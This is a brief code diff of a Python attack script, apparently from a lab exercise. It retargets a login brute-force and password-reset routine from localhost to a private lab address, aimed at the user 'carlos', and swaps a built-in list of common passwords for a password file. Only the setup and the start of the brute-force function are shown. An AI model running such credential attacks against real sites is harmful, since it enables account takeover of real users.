@@ -1,12 +1,11 @@
 import requests
 
-BASE_URL = "http://localhost/CyberProject/" 
+BASE_URL = "http://192.168.56.1/CyberProject/" 
 LOGIN_URL = BASE_URL + "login.php" 
 RESET_URL = BASE_URL + "reset_password.php"
 
 TARGET_USER = "carlos"
 NEW_PASSWORD = "123123"
-PASSWORDS_LIST = ["123456", "password", "12345", "qwerty", "carlos123"]
 
 def try_brute_force(filename="passwords.txt"):
     print(f"[*] Step 1: Starting Brute Force from file: {filename}")
